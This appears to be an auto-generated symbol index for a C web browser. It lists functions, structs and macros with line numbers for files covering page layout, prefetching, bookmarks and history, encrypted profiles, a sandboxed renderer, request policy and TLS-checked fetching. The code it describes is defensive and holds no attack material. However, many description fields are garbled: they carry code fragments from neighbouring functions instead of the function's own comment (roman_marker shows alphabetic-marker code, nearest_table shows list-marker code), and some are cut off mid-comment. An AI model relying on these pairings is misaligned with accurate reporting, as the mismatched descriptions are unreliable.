- `li_ordinal` (line 1738) `static int li_ordinal(const lxb_dom_node_t *li)` - *1-based position of an <li> among its <li> siblings (an <ol> counter, basic: the `start`/`value` attributes are out of scope). Counts preceding element siblings * that are <li>.*
- `roman_marker` (line 1764) `static void roman_marker(int n, int upper, char *out, size_t cap)` - *int k = 0; if (n < 1) n = 1; while (n > 0 && k < (int)sizeof buf) { int r = (n - 1) % 26; buf[k++] = (char)((upper ? 'A' : 'a') + r); n = (n - 1) / 26; } size_t o = 0; while (k > 0 && o + 1 < cap) out[o++] = buf[--k];     /* reverse if (o + 2 < cap) { out[o++] = '.'; out[o++] = ' '; } if (o < cap) out[o] = '\0'; } /* Roman-numeral ordinal (1->i, 4->iv, clamped to [1,3999]) as "iv. " into out.*
- `list_marker` (line 1789) `static void list_marker(int ordered, const lxb_dom_node_t *li, int list_style,
                  ...` - *Builds the list marker for the first run of an <li>. With no author list-style (CSS_LS_UNSET) it is the UA default: "N. " for an ordered list, "* " (bullet) otherwise. An author list-style-type selects the glyph/numbering (disc/circle/ square or decimal/alpha/roman). Written into out (size cap); ASCII or short UTF-8, so it is valid UTF-8 and safe to paint. CSS_LS_NONE is handled by the caller (no * marker emitted at all).*
- `nearest_table` (line 1809) `static const lxb_dom_node_t *nearest_table(const lxb_dom_node_t *n, const lxb_dom_node_t *base)` - *case CSS_LS_CIRCLE:      snprintf(out, cap, "\xE2\x97\xA6 "); return; /* U+25E6 white bullet case CSS_LS_SQUARE:      snprintf(out, cap, "\xE2\x96\xAA "); return; /* U+25AA small square case CSS_LS_DECIMAL:     snprintf(out, cap, "%d. ", ord); return; case CSS_LS_LOWER_ALPHA: alpha_marker(ord, 0, out, cap); return; case CSS_LS_UPPER_ALPHA: alpha_marker(ord, 1, out, cap); return; case CSS_LS_LOWER_ROMAN: roman_marker(ord, 0, out, cap); return; case CSS_LS_UPPER_ROMAN: roman_marker(ord, 1, out, cap); return; default: break;  /* unset: UA default below } if (ordered && li != NULL) snprintf(out, cap, "%d. ", ord); else                       snprintf(out, cap, "\xE2\x80\xA2 "); } /* Nearest <table> ancestor of n (up to base), or NULL.*
- `cell_has_nested_table` (line 1834) `static int cell_has_nested_table(const lxb_dom_node_t *cell)` - *Nonzero if cell has a descendant <table>: it is then a structural CONTAINER, not a leaf cell. Only leaf cells (no nested table) are collected as one text run; a container cell is walked so the inner table's cells are collected separately. This is what stops a legacy table-in-table layout (e.g. Hacker News: the story list is a <table> nested inside a <td> of the outer table) from flattening its whole subtree * into one giant run. Early-exit on the first nested table (bounded by the subtree).*
- `next_skip` (line 1843) `static lxb_dom_node_t *next_skip(lxb_dom_node_t *n, const lxb_dom_node_t *root)` - *Pre-order successor that does NOT descend into n's children (used to skip an * already-decided subtree during the table scan).*
- `cell_anchors` (line 1854) `static const lxb_dom_node_t *cell_anchors(const lxb_dom_node_t *cell, int *count)` - *First <a href> element in the cell's subtree, with *count receiving how many * such anchors exist, capped at 2 (only none / exactly-one / several matters).*
- `links` (line 1872) `* its links (the Hacker News case: every story link lives inside a <td>), so the
 * caller flows ...`
- `flow_table` (line 1903) `static int flow_table(pv_flow_reg *fr, const lxb_dom_node_t *table)`
- `table` (line 1919) `* FLOW table (multi-link: walked so its links survive) do NOT suppress their
 * content -- their ...`
- `collect_style_text` (line 1966) `static char *collect_style_text(lxb_dom_node_t *root, size_t *outlen)` - *Concatenates the text of every <style> element in the document (head included) into one owned, NUL-terminated buffer, capped at PV_MAX_STYLE_BYTES. Returns NULL when there is no <style> (or on OOM, treated by the caller as "no author CSS"). * *outlen receives the length.*
- `in_hidden_subtree` (line 2000) `static int in_hidden_subtree(const lxb_dom_node_t *n, const lxb_dom_node_t *base,
               ...` - *Nonzero if n or any ancestor up to base has display:none (from the <style> sheet or its inline style=). display:none is structural visibility, applied regardless * of caps.css (hidden content stays hidden, like the JS-off display:none caveat).*
- `in_boilerplate_subtree` (line 2015) `static int in_boilerplate_subtree(const lxb_dom_node_t *n, const lxb_dom_node_t *base)` - *Nonzero if n or any ancestor up to base is page boilerplate (<nav>/<header>/ <footer>/<aside>). Used only in distraction-free (reader) mode to drop chrome and * keep the main content. Deterministic, not heuristic article extraction.*
- `in_closed_details_subtree` (line 2030) `static int in_closed_details_subtree(const lxb_dom_node_t *n, const lxb_dom_node_t *base)` - *Nonzero if n or any ancestor up to base is inside a <details> without an `open` attribute and n is NOT inside its <summary> (the summary is always visible). * Used to suppress content of collapsed disclosure widgets.*
- `pv_build` (line 2049) `pv_status pv_build(const hp_document *doc, pv_view **out)`
- `pv_build_ex` (line 2053) `pv_status pv_build_ex(const hp_document *doc, int js_enabled, pv_view **out)`
- `pv_build_full` (line 2057) `pv_status pv_build_full(const hp_document *doc, int js_enabled, int reader,
                     ...`
- `pv_build_styled` (line 2062) `pv_status pv_build_styled(const hp_document *doc, int js_enabled, int reader,
                   ...`
- `appended` (line 2752) `* AFTER the run is appended (so THIS run's brk stays) but BEFORE the next. */
        if (cont.fl...`

**Macros:**
- `_POSIX_C_SOURCE` (line 9)
- `PV_MAX_DIM` (line 38)
- `PV_NODE_MAP_INIT_CAP` (line 212)
- `PV_COLOR_TOKEN_MAX` (line 718)
- `PV_MAX_CONTAINERS` (line 755)
- `PV_MAX_GRID_COLS` (line 757)
- `PV_MAX_STYLE_BYTES` (line 1960)

**Structs:**
- `pv_node_map` (line 214)
- `pv_cont_info` (line 765) - *Nearest-container info attached to a run, plus the flex per-item values (Stage 3): grow/shrink/basis/order come from the ITEM element (the container's direct child on the run's ancestor chain); direction from the container itself. Unset sentinels: grow/shrink -1, basis/order CSS_LEN_UNSET, direction 0. `item` is that same direct child (NULL = anonymous item: text directly inside the container); pv_build maps it * to the run's cont_item ordinal so inline fragments of one child share one item.*
- `pv_item_track` (line 791) - *Per-container item-ordinal tracker: ord[cid] is the ordinal last handed out for container cid, node[cid] the direct-child element it belongs to. A run whose item differs from the tracked one (or is NULL = anonymous) opens the next ordinal, so consecutive runs of one child share it and nested-container interruptions do not * break the outer container's item continuity.*
- `pv_box_info` (line 810) - *Author box model resolved for a run: horizontal placement (l/r insets, w cap, centered) from the nearest block ancestor that declares a box, plus the leaf * block's own vertical-margin override (mt/mb, or PV_LEN_UNSET).*
- `pv_container_reg` (line 962) - *Document-order registry of flex/grid container nodes, so the runs of one * container share a stable id.*
- `pv_box_reg` (line 979) - *Box engine (Hito 23b-8 Step D): document-order registry of box-carrying block nodes plus each box's resolved definition (decoration + parent link). A box's * block_id is its index here, so the painter can reconstruct the box tree.*
- `pv_style_cache` (line 1076) - *Per-document memo of cch_element_style() results, keyed by element pointer. resolve_context()/in_hidden_subtree() call cch_element_style once per ANCESTOR on every walk from a node up to `base`; a common ancestor (e.g. <body>, a wrapper <div>) is revisited once per descendant text/element node, and each revisit re-runs the full O(nsels) cascade from scratch. On a page with a real stylesheet (hundreds to thousands of selectors -- see css.c's CSS_MAX_* caps) that redundant work dominates page_view's runtime. The cache trades it for one cascade per unique element plus a linear scan (bounded by the document's own element count, normally far smaller than the selector count). Grows like pv_node_map: a dynamic array, doubling, degrading to "no cache" (not a crash) * on OOM.*
- `form_rec` (line 1479) - *One <form> seen in document order: its grouping id is its index. action is an owned NUL-terminated copy of the raw action attribute (or NULL); method is GET * unless method="post".*
- `form_table` (line 1485)
- `pv_flow_reg` (line 1898) - *Cache of the per-table flow decision (a table subtree is scanned at most once, * anti-DoS). Registry full => grid (the previous behaviour), bounded fail-closed.*

#### `pdf_export.c`
**Path:** `src/pdf_export.c`

**Functions:**
- `pe_safe_basename` (line 24) `pe_status pe_safe_basename(const char *title, char *out, size_t outsz)`
- `pe_build_path_ext` (line 65) `pe_status pe_build_path_ext(const char *dir, const char *title, const char *ext,
                ...`
- `pe_build_path` (line 90) `pe_status pe_build_path(const char *dir, const char *title, char *out, size_t outsz)`
- `pe_paginate` (line 94) `size_t pe_paginate(const double *tops, const double *heights, size_t n,
                   double...`

#### `prefetch.c`
**Path:** `src/prefetch.c`

**Functions:**
- `is_ws` (line 22) `static int is_ws(char c)` - *Longest raw reference the scanner keeps; matches URL_MAX_LEN (url.h) so a * ref the fetch path would reject on length is never even queued. define PF_MAX_URL 8192*
- `is_name_char` (line 26) `static int is_name_char(char c)`
- `lower` (line 31) `static int lower(int c)`
- `ci_starts` (line 37) `static int ci_starts(const char *p, const char *end, const char *kw)` - *static int is_ws(char c) { return c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f'; } static int is_name_char(char c) { return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-'; } static int lower(int c) { return (c >= 'A' && c <= 'Z') ? c + ('a' - 'A') : c; } /* Case-insensitive: [p,end) starts with kw.*
- `ci_find` (line 46) `static const char *ci_find(const char *p, const char *end, const char *kw)` - *static int lower(int c) { return (c >= 'A' && c <= 'Z') ? c + ('a' - 'A') : c; } /* Case-insensitive: [p,end) starts with kw. static int ci_starts(const char *p, const char *end, const char *kw) { for (size_t i = 0; kw[i] != '\0'; ++i) { if (p + i >= end || lower((unsigned char)p[i]) != (unsigned char)kw[i]) return 0; } return 1; } /* First case-insensitive occurrence of kw in [p,end), or NULL.*
- `ci_eq_span` (line 54) `static int ci_eq_span(const char *s, size_t n, const char *kw)`
- `emit` (line 116) `static void emit(pf_list *out, pf_kind kind, const char *val, size_t vlen)`
- `pf_scan` (line 129) `int pf_scan(const char *html, size_t len, pf_list *out)`
- `pf_list_free` (line 192) `void pf_list_free(pf_list *l)`
- `pf_worker` (line 200) `static void *pf_worker(void *arg)` - *} p++; } return 0; } void pf_list_free(pf_list *l) { if (l == NULL) return; for (size_t i = 0; i < l->count; ++i) free(l->refs[i].url); l->count = 0; } /* --- pool --------------------------------------------------------------*
- `pf_pool_start` (line 226) `int pf_pool_start(pf_pool *p, const char *const *urls, size_t nurls,
                  pf_fetch_f...`
- `pf_pool_take` (line 270) `int pf_pool_take(pf_pool *p, const char *url, int *rc, int *status,
                 char **body,...`
- `pf_pool_finish` (line 309) `void pf_pool_finish(pf_pool *p)`
- `pf_pooled_fetch` (line 323) `int pf_pooled_fetch(void *vctx, const char *method, const char *url,
                    const ch...`

**Macros:**
- `_POSIX_C_SOURCE` (line 11)
- `PF_MAX_URL` (line 21)

**Structs:**
- `attr_span` (line 62)

#### `prefs.c`
**Path:** `src/prefs.c`

**Functions:**
- `url_valid` (line 26) `static int url_valid(const char *url)` - *A representable URL: 1..PREFS_MAX_URL-1 bytes, no control bytes, no DEL. * Space is allowed (local paths may carry it; fields are tab-separated).*
- `title_clean` (line 39) `static char *title_clean(const char *src)` - *Copies src into a fresh buffer, mapping control bytes/DEL to ' ' and truncating to PREFS_MAX_TITLE bytes on a UTF-8 sequence boundary. A NULL * src yields "". Returns NULL only on OOM.*
- `prefs_init` (line 65) `void prefs_init(prefs_state *p)` - *((unsigned char)dst[n - 1 - back] & 0xC0u) == 0x80u) { ++back; } if (back < n) { unsigned char lead = (unsigned char)dst[n - 1 - back]; size_t need = (lead >= 0xF0u) ? 4 : (lead >= 0xE0u) ? 3 : (lead >= 0xC0u) ? 2 : 1; if (need > back + 1) n -= back + 1;  /* incomplete: drop the sequence } dst[n] = '\0'; return dst; } /* --- lifecycle -------------------------------------------------------------*
- `prefs_free` (line 73) `void prefs_free(prefs_state *p)`
- `bookmark_push` (line 91) `static prefs_status bookmark_push(prefs_state *p, const char *url, const char *title)` - *Appends a cleaned bookmark. Duplicate URLs are skipped (PREFS_OK). Used by * the toggle's add path and by the parser.*
- `history_push_back` (line 109) `static prefs_status history_push_back(prefs_state *p, const char *url)` - *Appends a history entry at the BACK preserving document order (parser path; * the API path inserts at the front). Duplicates and overflow are skipped.*
- `prefs_bookmark_index` (line 124) `int prefs_bookmark_index(const prefs_state *p, const char *url)` - *if (p->history_len >= PREFS_MAX_HISTORY) return PREFS_OK; for (size_t i = 0; i < p->history_len; ++i) if (strcmp(p->history[i], url) == 0) return PREFS_OK; char **grown = (char **)realloc(p->history, (p->history_len + 1) * sizeof *grown); if (grown == NULL) return PREFS_ERR_OOM; p->history = grown; char *u = strdup(url); if (u == NULL) return PREFS_ERR_OOM; p->history[p->history_len++] = u; return PREFS_OK; } /* --- public list operations ---------------------------------------------------*
- `prefs_bookmark_toggle` (line 131) `prefs_status prefs_bookmark_toggle(prefs_state *p, const char *url,
                             ...`
- `prefs_history_add` (line 151) `prefs_status prefs_history_add(prefs_state *p, const char *url)`
- `prefs_format` (line 182) `prefs_status prefs_format(const prefs_state *p, char **out, size_t *out_len)` - *p->history_len--; } char **grown = (char **)realloc(p->history, (p->history_len + 1) * sizeof *grown); if (grown == NULL) { free(u); return PREFS_ERR_OOM; } p->history = grown; memmove(&p->history[1], &p->history[0], p->history_len * sizeof p->history[0]); p->history[0] = u; p->history_len++; return PREFS_OK; } /* --- serialization ----------------------------------------------------------------*
- `apply_kv` (line 225) `static void apply_kv(prefs_state *out, const char *key, long val)` - *} for (size_t i = 0; i < p->history_len; ++i) { size_t space = cap - n; if (space == 0) break; int r = snprintf(buf + n, space, "h\t%s\n", p->history[i]); if (r < 0 || (size_t)r >= space) { n = cap; break; } n += (size_t)r; } out = buf; out_len = n; return PREFS_OK; } /* Normalises one key=value pair into out (clamps / safe defaults).*
- `prefs_parse` (line 240) `prefs_status prefs_parse(const char *text, size_t len, prefs_state *out)`
- `ci_eq` (line 299) `static int ci_eq(char a, char b)` - *char *eq = strchr(lbuf, '='); if (eq != NULL && eq != lbuf) { eq = '\0'; apply_kv(out, lbuf, strtol(eq + 1, NULL, 10)); } } } /* Oversized or malformed lines are skipped (forward compatibility). line = (nl != NULL) ? nl + 1 : end; } return PREFS_OK; } /* --- omnibox suggestions ---------------------------------------------------------------*
- `ci_starts` (line 305) `static int ci_starts(const char *s, const char *q)`
- `ci_contains` (line 313) `static int ci_contains(const char *s, const char *q)`
- `url_prefix_match` (line 323) `static int url_prefix_match(const char *url, const char *q)` - *Prefix match as the user types it: the raw URL, past the scheme, and past a * leading "www." ("wiki" hits "https://www.wikipedia.org/").*
- `sugg_push` (line 335) `static void sugg_push(char *out, size_t row_len, int max_rows, int *n,
                      cons...` - *Prefix match as the user types it: the raw URL, past the scheme, and past a * leading "www." ("wiki" hits "https://www.wikipedia.org/"). static int url_prefix_match(const char *url, const char *q) { if (ci_starts(url, q)) return 1; const char *p = strstr(url, "://"); if (p != NULL) { p += 3; if (ci_starts(p, q)) return 1; if (ci_starts(p, "www.") && ci_starts(p + 4, q)) return 1; } return 0; } /* Appends url to the result rows unless present, oversized or full.*
- `prefs_suggest` (line 343) `int prefs_suggest(const prefs_state *p, const char *query,
                  char *out, size_t ro...`
- `sb_put` (line 368) `static void sb_put(sbuf *b, const char *s, size_t n)`
- `sb_str` (line 383) `static void sb_str(sbuf *b, const char *s)`
- `sb_esc` (line 387) `static void sb_esc(sbuf *b, const char *s)` - *while (nc < b->len + n + 1) nc *= 2; char *nd = (char *)realloc(b->data, nc); if (nd == NULL) { b->oom = 1; return; } b->data = nd; b->cap = nc; } memcpy(b->data + b->len, s, n); b->len += n; b->data[b->len] = '\0'; } static void sb_str(sbuf *b, const char *s) { sb_put(b, s, strlen(s)); } /* HTML-escapes hostile text into the page (&<>"').*
- `sb_link_item` (line 399) `static void sb_link_item(sbuf *b, const char *url, const char *label)`
- `prefs_bookmarks_page` (line 407) `prefs_status prefs_bookmarks_page(const prefs_state *p, char **out, size_t *out_len)`

**Macros:**
- `_POSIX_C_SOURCE` (line 10)
- `PREFS_MAGIC` (line 19)

**Structs:**
- `sbuf` (line 367)

#### `profile.c`
**Path:** `src/profile.c`

**Functions:**
- `join_path` (line 28) `static int join_path(const profile_ctx *ctx, const char *name,
                     char *out, si...` - *#include "disk_store.h" #include <errno.h> #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <unistd.h> #include <openssl/crypto.h> #include <openssl/rand.h> #define PROFILE_KEYFILE_LEN (LS_SALT_LEN + LS_KEY_LEN)  /* 16 + 32*
- `keyfile_create` (line 36) `static profile_status keyfile_create(const char *dir, const char *path,
                         ...` - *#include <unistd.h> #include <openssl/crypto.h> #include <openssl/rand.h> #define PROFILE_KEYFILE_LEN (LS_SALT_LEN + LS_KEY_LEN)  /* 16 + 32 static int join_path(const profile_ctx *ctx, const char *name, char *out, size_t cap) { int n = snprintf(out, cap, "%s/%s", ctx->dir, name); return (n > 0 && (size_t)n < cap) ? 0 : -1; } /* Writes the fresh keyfile atomically (tmp 0600 + fsync + rename).*
- `profile_open` (line 58) `profile_status profile_open(profile_ctx *ctx, const char *dir)`
- `map_ds` (line 97) `static profile_status map_ds(ds_status ds)`
- `profile_load` (line 111) `profile_status profile_load(const profile_ctx *ctx, prefs_state *out)`
- `profile_save` (line 132) `profile_status profile_save(const profile_ctx *ctx, const prefs_state *p)`
- `profile_close` (line 148) `void profile_close(profile_ctx *ctx)`

**Macros:**
- `_POSIX_C_SOURCE` (line 10)
- `PROFILE_KEYFILE_LEN` (line 26)

#### `render_doc.c`
**Path:** `src/render_doc.c`

**Functions:**
- `utf8_sanitized_dup` (line 25) `static char *utf8_sanitized_dup(const char *s)` - *UTF-8 sanitisation, kept local so render_doc stays self-contained (matching the convention in browser.c and page_view.c). Output is never longer than the * input.*
- `rd_push` (line 59) `static int rd_push(rd_doc *d, rd_kind kind, int heading_level, int block_break,
                 ...` - *Appends one block, taking owned copies of text (required) and href (optional). * Returns 0 on success, -1 on allocation failure (the doc is left consistent).*
- `rd_push_input` (line 165) `static int rd_push_input(rd_doc *d, int block_break, const pv_run *r)` - *Appends an RD_INPUT block, copying text (placeholder/label), the form action * (href), and the control name/value. Returns 0, or -1 on allocation failure.*
- `rd_build` (line 187) `rd_status rd_build(const pv_view *view, rdp_caps caps,
                   const char *top_level_u...`
- `url_resolve_file` (line 276) `url_resolve_file(top_level_url, r->src,
                                                resolved,...`
- `rd_free` (line 438) `void rd_free(rd_doc *d)`
- `rd_count` (line 453) `size_t rd_count(const rd_doc *d)`
- `rd_at` (line 457) `const rd_block *rd_at(const rd_doc *d, size_t i)`
- `rd_box_count` (line 462) `size_t rd_box_count(const rd_doc *d)`
- `rd_box_at` (line 466) `const pv_box_def *rd_box_at(const rd_doc *d, size_t i)`
- `rd_kind_name` (line 471) `const char *rd_kind_name(rd_kind k)`
- `rd_block_tag` (line 484) `const char *rd_block_tag(const rd_block *b)`
- `rd_input_label` (line 514) `const char *rd_input_label(int input_type)`
- `rd_image_label` (line 532) `const char *rd_image_label(rdp_img_decision d)`
- `rd_image_fail_label` (line 543) `const char *rd_image_fail_label(img_fail_reason reason)`

#### `render_policy.c`
**Path:** `src/render_policy.c`

**Functions:**
- `rdp_caps_safe` (line 16) `rdp_caps rdp_caps_safe(void)` - *include "data_url.h" include "request_policy.h"*
- `rdp_is_tracking_pixel` (line 21) `int rdp_is_tracking_pixel(int w, int h)`
- `rdp_image_decision` (line 27) `rdp_img_decision rdp_image_decision(rdp_caps caps,
                                    const char...`
- `rdp_img_reason` (line 62) `const char *rdp_img_reason(rdp_img_decision d)`
- `rdp_images_warning` (line 73) `const char *rdp_images_warning(void)`

#### `renderer.c`
**Path:** `src/renderer.c`

**Functions:**
- `child_render` (line 24) `static void child_render(int wfd, const char *html, size_t len)` - *#include "html_parse.h" #include "os_sandbox.h" #include "util.h" #include <errno.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/wait.h> /* --- child: confine, parse, emit framed result, never return to caller ---*
- `read_field` (line 52) `static int read_field(int fd, char **out, size_t *out_len)` - *int ok = (title != NULL && text != NULL) && write_full(wfd, &tl, sizeof tl) == 0 && (tl == 0 || write_full(wfd, title, tl) == 0) && write_full(wfd, &xl, sizeof xl) == 0 && (xl == 0 || write_full(wfd, text, xl) == 0); hp_free(title); hp_free(text); hp_document_free(doc); _exit(ok ? 0 : 92); } /* --- parent: read one length-prefixed owned field (capped) ---*
- `rd_render_html` (line 69) `rd_status rd_render_html(const char *html, size_t len, rd_result *out)` - *if (read_full(fd, &n, sizeof n) != 0) return -1; if (n > RD_MAX_FIELD) return -1; /* anti-amplification: reject huge lengths if (n == (size_t)-1) return -1; char *buf = (char *)malloc(n + 1); if (buf == NULL) return -1; if (n != 0 && read_full(fd, buf, n) != 0) { free(buf); return -1; } buf[n] = '\0'; out = buf; out_len = n; return 0; } /* --- public ---*
- `rd_result_free` (line 119) `void rd_result_free(rd_result *out)`

**Macros:**
- `_POSIX_C_SOURCE` (line 6)

#### `request_policy.c`
**Path:** `src/request_policy.c`

**Functions:**
- `lower` (line 21) `static char lower(char c)` - *all output goes to caller-provided bounded buffers.  #include "request_policy.h" #include "psl_data.h" #include <stdlib.h> #include <string.h> #define RP_MAX_HOST   255u  /* RFC 1035 maximum host length #define RP_MAX_LABELS 128u  /* far above any real host's label count /* --- helpers ---*
- `ci_starts_with` (line 25) `static int ci_starts_with(const char *s, const char *prefix)`
- `psl_cmp` (line 35) `static int psl_cmp(const void *key, const void *elem)` - *static char lower(char c) { return (c >= 'A' && c <= 'Z') ? (char)(c + ('a' - 'A')) : c; } static int ci_starts_with(const char *s, const char *prefix) { while (*prefix) { if (*s == '\0' || lower(*s) != lower(*prefix)) return 0; ++s; ++prefix; } return 1; } /* --- Public Suffix List lookup (binary search over the generated tables) ---*
- `psl_in` (line 39) `static int psl_in(const char *const *arr, size_t n, const char *key)`
- `public_suffix_labels` (line 48) `static size_t public_suffix_labels(const char *host, const size_t *off, size_t n)` - *Number of labels of the public suffix (eTLD) of a lowercased host, applying the full PSL algorithm: exception rules win; otherwise the longest matching normal or wildcard rule; otherwise the implicit "*" rule (one label). * off[] holds the byte offset of each label start; n is the label count.*
- `rp_host_of` (line 75) `int rp_host_of(const char *url, char *out, size_t out_size)` - *} if (s + 1 < n) { const char *parent = host + off[s + 1]; /* labels[s+1..n-1] if (psl_in(psl_wildcards, psl_wildcards_n, parent)) { if (ncand > best) best = ncand; } } } if (exception >= 0) return (size_t)exception;     /* exceptions prevail return (best >= 1) ? (size_t)best : 1;            /* else longest, or "*" } /* --- public ---*
- `rp_site_of` (line 101) `int rp_site_of(const char *host, char *out, size_t out_size)`
- `rp_same_site` (line 133) `int rp_same_site(const char *top_level_url, const char *request_url)`
- `rp_evaluate` (line 142) `rp_decision rp_evaluate(const char *top_level_url, const char *request_url)`

**Macros:**
- `RP_MAX_HOST` (line 16)
- `RP_MAX_LABELS` (line 18)

#### `secure_fetch.c`
**Path:** `src/secure_fetch.c`

**Functions:**
- `ci_starts_with` (line 43) `static int ci_starts_with(const char *haystack, const char *prefix)` - */* --- small helpers (no libc locale dependence) --- static int ci_equal(const char *a, const char *b) { while (*a && *b) { int ca = (unsigned char)*a, cb = (unsigned char)*b; if (ca >= 'A' && ca <= 'Z') ca += 'a' - 'A'; if (cb >= 'A' && cb <= 'Z') cb += 'a' - 'A'; if (ca != cb) return 0; ++a; ++b; } return *a == '\0' && *b == '\0'; } /* Case-insensitive: does haystack start with prefix?*
- `ci_index` (line 55) `static long ci_index(const char *haystack, const char *needle)` - */* Case-insensitive: does haystack start with prefix? static int ci_starts_with(const char *haystack, const char *prefix) { while (*prefix) { int ch = (unsigned char)*haystack, cp = (unsigned char)*prefix; if (ch >= 'A' && ch <= 'Z') ch += 'a' - 'A'; if (cp >= 'A' && cp <= 'Z') cp += 'a' - 'A'; if (ch != cp) return 0; ++haystack; ++prefix; } return 1; } /* Case-insensitive index of needle in haystack, or -1.*
- `sf_share_lock` (line 66) `static void sf_share_lock(CURL *handle, curl_lock_data data,
                          curl_lock_...`
- `sf_share_unlock` (line 72) `static void sf_share_unlock(CURL *handle, curl_lock_data data, void *userptr)`
- `sf_global_init` (line 79) `void sf_global_init(void)` - *static pthread_mutex_t sf_cookie_lock = PTHREAD_MUTEX_INITIALIZER; static void sf_share_lock(CURL *handle, curl_lock_data data, curl_lock_access access, void *userptr) { (void)handle; (void)data; (void)access; (void)userptr; pthread_mutex_lock(&sf_cookie_lock); } static void sf_share_unlock(CURL *handle, curl_lock_data data, void *userptr) { (void)handle; (void)data; (void)userptr; pthread_mutex_unlock(&sf_cookie_lock); } /* --- public: defaults ---*
- `sf_cookie_line_matches` (line 94) `int sf_cookie_line_matches(const char *line, const char *host, const char *path,
                ...`
- `sf_url_host_path` (line 150) `static int sf_url_host_path(const char *url, char *host, size_t hostsz,
                         ...` - *Extracts host + path from a validated https url into caller buffers (path defaults * to "/"). Returns 0 on success, -1 on failure.*
- `sf_cookie_header_for` (line 164) `size_t sf_cookie_header_for(const char *url, char *out, size_t outsz)`
- `sf_cookie_put` (line 193) `void sf_cookie_put(const char *url, const char *namevalue)`
- `sf_config_default` (line 214) `sf_config sf_config_default(void)`
- `sf_user_agent_or_default` (line 239) `const char *sf_user_agent_or_default(const char *ua)`
- `sf_impersonate_kex_groups` (line 243) `const char *sf_impersonate_kex_groups(void)`
- `sf_impersonate_tls13_ciphers` (line 245) `const char *sf_impersonate_tls13_ciphers(void)`
- `sf_validate_url` (line 248) `sf_status sf_validate_url(const char *url)` - *c.progress_cb = NULL; c.range_start = -1; /* -1 means no byte-range c.range_end = -1; return c; } const char *sf_user_agent_or_default(const char *ua) { return (ua != NULL && ua[0] != '\0') ? ua : SF_DEFAULT_USER_AGENT; } const char *sf_impersonate_kex_groups(void)    { return SF_IMPERSONATE_KEX_GROUPS; } const char *sf_impersonate_tls13_ciphers(void) { return SF_IMPERSONATE_TLS13_CIPHERS; } /* --- public: pure validators ---*
- `sf_url_is_http` (line 257) `static int sf_url_is_http(const char *url)` - *Nonzero iff url is "http://host..." (case-insensitive) with a non-empty host. Plain http is only ever permitted for overlay (.onion/.i2p) realms, gated by * sf_config.allow_overlay_http; the overlay layer provides encryption + authenticity.*
- `sf_check_tls_version` (line 268) `sf_status sf_check_tls_version(const char *negotiated_version)`
- `sf_check_group_is_pq` (line 273) `sf_status sf_check_group_is_pq(const char *negotiated_group)`
- `sf_check_chain_policy` (line 282) `sf_status sf_check_chain_policy(const sf_chain_info *chain, sf_policy policy)`
- `sf_enforce_policy` (line 292) `sf_status sf_enforce_policy(const char *tls_version, const char *group,
                         ...`
- `copy_checked` (line 323) `static int copy_checked(char *dst, size_t dstsz, const char *src)` - *The navigability fallback accepts a classical KE; every other policy requires * a PQ-hybrid group. The certificate chain is always validated below. /* Allow classical KE when --insecure is used if (policy != SF_POLICY_ALLOW_CLASSICAL_KE && policy != SF_POLICY_ALLOWLISTED_INSECURE) { s = sf_check_group_is_pq(group); if (s != SF_OK) return s; } if (chain == NULL) return SF_ERR_INTERNAL; /* fail closed: chain not inspectable return sf_check_chain_policy(chain, policy); } /* --- bounded string helper (overflow => -1, never truncate) ---*
- `sf_is_redirect_code` (line 332) `int sf_is_redirect_code(long http_code)` - *if (chain == NULL) return SF_ERR_INTERNAL; /* fail closed: chain not inspectable return sf_check_chain_policy(chain, policy); } /* --- bounded string helper (overflow => -1, never truncate) --- static int copy_checked(char *dst, size_t dstsz, const char *src) { size_t n = strlen(src); if (n + 1 > dstsz) return -1; memcpy(dst, src, n + 1); return 0; } /* --- public: pure redirect logic ---*
- `sf_parse_location_header` (line 339) `sf_status sf_parse_location_header(const char *header_line, char *out, size_t outsz)`
- `sf_resolve_redirect` (line 357) `sf_status sf_resolve_redirect(const char *base_url, const char *location,
                       ...`
- `sf_ci_prefix` (line 370) `static int sf_ci_prefix(const char *s, const char *p)` - *Reference resolution + the https-only / no-downgrade policy live in the pure url module (DRY); a redirect is just a reference resolved against the * current URL, fail-closed to an absolute https URL. return (url_resolve_https(base_url, location, out, outsz) == URL_OK) ? SF_OK : SF_ERR_INVALID_URL; } /* Case-insensitive prefix test.*
- `sf_response_free` (line 409) `void sf_response_free(sf_response *resp)` - *if (sf_ci_prefix(location, "http://")) { if (snprintf(hloc, sizeof hloc, "https://%s", location + 7) >= (int)sizeof hloc) return SF_ERR_INVALID_URL; } else { if (snprintf(hloc, sizeof hloc, "%s", location) >= (int)sizeof hloc) return SF_ERR_INVALID_URL; } if (url_resolve_https(hbase, hloc, tmp, sizeof tmp) != URL_OK) return SF_ERR_INVALID_URL; if (!sf_ci_prefix(tmp, "https://")) return SF_ERR_INVALID_URL; if (snprintf(out, outsz, "http://%s", tmp + 8) >= (int)outsz) return SF_ERR_INVALID_URL; return SF_OK; } /* --- public: cleanup ---*
- `copy_bounded` (line 468) `static void copy_bounded(char *dst, size_t dstsz, const char *src)`
- `get_negotiated_group_name` (line 480) `static const char *get_negotiated_group_name(SSL *ssl)` - *static int inspect_chain(SSL *ssl, sf_chain_info *info, char *sigbuf, size_t sigbuf_len); static void copy_bounded(char *dst, size_t dstsz, const char *src) { if (dstsz == 0) return; dst[0] = '\0'; if (src == NULL) return; size_t i = 0; for (; src[i] != '\0' && i + 1 < dstsz; ++i) dst[i] = src[i]; dst[i] = '\0'; } /* Helper: Extracts the name of the TLS group actually negotiated from OpenSSL*
- `tls_capture_try` (line 511) `static void tls_capture_try(tls_capture *cap)` - *first shared group, which corresponds to the negotiated key exchange * group (for both TLS 1.2 ECDHE and TLS 1.3). nid = SSL_get_shared_group(ssl, 0); #endif if (nid == 0) { return NULL; /* There is no negotiated group (e.g., TLS 1.2 without PFS or failure) } /* OBJ_nid2sn returns the short name (e.g., "X25519", "prime256v1", "x25519") return OBJ_nid2sn(nid); } /* Idempotent: takes the TLS snapshot the first time the SSL* is reachable.*
- `header_cb` (line 543) `static size_t header_cb(char *buffer, size_t size, size_t nitems, void *userdata)` - *Fires for every HTTP response (status line + headers) even when there is no * body, so it is the reliable point to snapshot the negotiated TLS state.*
- `write_cb` (line 578) `static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata)`
